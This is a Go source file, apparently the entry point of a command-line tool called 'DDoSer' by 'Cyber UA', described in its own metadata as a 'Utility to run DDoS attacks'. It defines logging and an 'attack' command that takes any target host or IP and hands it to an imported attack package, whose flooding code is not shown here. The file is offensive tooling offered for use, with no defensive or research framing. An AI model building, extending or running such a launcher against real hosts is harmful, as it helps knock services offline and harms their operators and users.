package main

import (
	"os"
	"runtime"
	"strings"

	"github.com/cyberua/ddoser/attack"
	"github.com/op/go-logging"
	"github.com/urfave/cli/v2"
)

var logger = logging.MustGetLogger("main")

func main() {

	app := &cli.App{
		EnableBashCompletion: true,
		Version:              "v0.0.1",
		Authors: []*cli.Author{
			{
				Name:  "Cyber UA",
				Email: "ua@netwatch.app",
			},
		},
		Copyright: "(c) 2022 Cyber UA",
		Flags: []cli.Flag{
			&cli.StringFlag{
				Name:  "verbose",
				Value: "NOTICE",
				Usage: "verbosity level: CRIT, ERROR, WARN, NOTICE, INFO, DEBUG",
			},
			&cli.IntFlag{
				Name:  "seed",
				Value: 0x13,
				Usage: "seed to use for PRG",
			},
		},
		Name:        "DDoSer",
		Description: "Utility to run DDoS attacks",
		Before: func(c *cli.Context) error {
			configureLogging(strings.ToUpper(c.String("verbose")))

			logger.Criticalf("GOMAXPROCS: %d", runtime.GOMAXPROCS(0))

			return nil
		},
		Commands: []*cli.Command{
			{
				Name:  "attack",
				Usage: "launch the DDoS attack",
				Before: func(c *cli.Context) error {
					attack.SetLogger(logger)
					return nil
				},
				Flags: []cli.Flag{
					&cli.StringFlag{
						Name:  "target",
						Value: "website.com",
						Usage: "the target: host or IP",
					},
				},
				Action: func(c *cli.Context) error {
					attack.Attack(
						c.String("target"),
					)
					return nil
				},
			},
		},
	}

	err := app.Run(os.Args)
	if err != nil {
		logger.Fatal(err)
	}
}

func configureLogging(verbose string) {
	logging.SetFormatter(
		logging.MustStringFormatter(`%{color}%{time:15:04:05.000} %{shortfunc:22s} ▶ %{level:8s} %{id:03x}%{color:reset} |	 %{message}`),
	)
	levelBackend := logging.AddModuleLevel(logging.NewLogBackend(os.Stdout, "", 0))
	switch verbose {
	case "CRIT":
		levelBackend.SetLevel(logging.CRITICAL, "")
	case "ERROR":
		levelBackend.SetLevel(logging.ERROR, "")
	case "WARN":
		levelBackend.SetLevel(logging.WARNING, "")
	case "NOTICE":
		levelBackend.SetLevel(logging.NOTICE, "")
	case "INFO":
		levelBackend.SetLevel(logging.INFO, "")
	case "DEBUG":
		levelBackend.SetLevel(logging.DEBUG, "")
	default:
		levelBackend.SetLevel(logging.DEBUG, "")
		logger.Fatalf("Invalid verbosity level: %s", verbose)
	}
	logging.SetBackend(levelBackend)
}
